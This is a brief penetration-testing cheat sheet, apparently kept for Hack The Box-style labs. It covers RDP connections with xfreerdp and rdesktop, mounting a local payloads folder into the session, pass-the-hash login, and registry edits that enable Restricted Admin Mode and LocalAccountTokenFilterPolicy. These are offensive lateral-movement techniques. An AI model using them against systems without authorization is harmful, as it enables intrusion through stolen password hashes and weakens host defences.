# Connect

```sh
xfreerdp3 /u:"$user" /p:"$pass" /v:$target:3389
```

```sh
rdesktop $target -d HTB -u "$user" -p "$pass"
```

# Connect and mount local directory

Mount a directory from linux machine when connect to rdp. Connect with `\\tsclient\`

```sh
xfreerdp /u:"$user" /p:"$pass" /v:$target /drive:linux,/home/kali/payloads/
```

```sh
rdesktop $target -u "$user" -p "$pass" -r disk:linux='/home/kali/payloads'
```

# Pass the hash

```sh
xfreerdp3  /v:$target /u:"$user" /pth:"$hash"
```

If presented with `account restrictions preventing this user from logging in`, enable `Restricted Admin Mode`

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


>Note: UAC allows only built-in local admin account (RID-500, "Administrator") to perform remote administration tasks. Set it to 1 if you need it.

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 0x1 /f
```
